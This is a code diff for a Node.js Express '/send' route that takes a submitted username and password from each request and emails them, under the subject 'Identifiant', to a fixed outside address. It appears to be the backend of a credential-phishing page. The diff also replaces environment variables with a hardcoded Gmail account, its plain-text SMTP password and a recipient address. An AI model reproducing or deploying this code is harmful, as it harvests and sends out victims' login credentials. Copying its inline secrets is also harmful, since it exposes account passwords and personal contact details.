@@ -26,14 +26,14 @@ app.post('/send', async (req, res) => {
         port: 587,
         secure: false, // true for 465, false for other ports
         auth: {
-          user: process.env.EMAIL, // generated ethereal user
-          pass: process.env.PASSWORD, // generated ethereal password
+          user: "yacini.kenzy@gmail.com", // generated ethereal user
+          pass: "xpwww555aze123", // generated ethereal password
         },
       });
 
     await transporter.sendMail({
-    from: process.env.EMAIL, // sender address
-    to: process.env.DESTINATION, // list of receivers
+    from: "yacini.kenzy@gmail.com", // sender address
+    to: "kyacini@yahoo.fr", // list of receivers
     subject: "Identifiant", // Subject line
     text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
     }, (err, info) => {
